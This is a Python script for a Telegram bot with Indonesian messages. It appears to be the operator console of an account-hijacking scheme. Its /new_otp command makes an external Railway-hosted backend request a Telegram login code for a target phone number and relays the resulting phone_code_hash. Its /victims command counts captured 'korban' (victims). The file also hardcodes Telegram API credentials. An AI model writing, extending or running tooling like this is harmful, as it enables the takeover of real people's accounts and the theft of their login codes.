from telethon import TelegramClient, events
import os
import asyncio
import requests
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

API_ID = 24289127
API_HASH = 'cd63113435f4997590ee4a308fbf1e2c'
BOT_TOKEN = os.environ.get('BOT_TOKEN')
RAILWAY_URL = 'https://siluman-cancut-production.up.railway.app'

bot = TelegramClient('debug_bot', API_ID, API_HASH)

@bot.on(events.NewMessage)
async def handle_all_messages(event):
    print(f"🎯 DEBUG: Received message: {event.message.text}")
    
    try:
        text = event.message.text
        
        if text.startswith('/start'):
            print("🔄 Processing /start")
            await event.reply('🤖 DEBUG BOT AKTIF! 😈\nBot bisa baca command!')
            print("✅ Replied to /start")
            
        elif text.startswith('/new_otp'):
            print("🔄 Processing /new_otp")
            if ' ' in text:
                phone = text.split(' ', 1)[1].strip()
                print(f"📱 Requesting OTP for: {phone}")
                
                response = requests.get(f'{RAILWAY_URL}/get_new_otp?phone={phone}')
                print(f"📡 API Response: {response.status_code}")
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get('success'):
                        await event.reply(f'✅ OTP DIMINTA! 😈\n📱 {phone}\n🔑 Hash: {data["phone_code_hash"]}')
                    else:
                        await event.reply(f'❌ Gagal: {data.get("error")}')
                else:
                    await event.reply('❌ API Error')
            else:
                await event.reply('❌ Format: /new_otp +62xxx')
                
        elif text.startswith('/victims'):
            print("🔄 Processing /victims")
            response = requests.get(f'{RAILWAY_URL}/victims')
            if response.status_code == 200:
                victims = response.json().get('victims', [])
                await event.reply(f'🎯 VICTIMS: {len(victims)} korban')
            else:
                await event.reply('❌ Gagal ambil victims')
                
        elif text.startswith('/status'):
            await event.reply('🤖 DEBUG BOT STATUS: ONLINE 😈\nCommands working!')
            
        else:
            await event.reply('❌ Command tidak dikenali')
            
    except Exception as e:
        print(f"💀 ERROR: {e}")
        await event.reply(f'💀 Error: {str(e)}')

async def main():
    print("🚀 STARTING DEBUG BOT...")
    await bot.start(bot_token=BOT_TOKEN)
    print("🤖 DEBUG BOT STARTED!")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
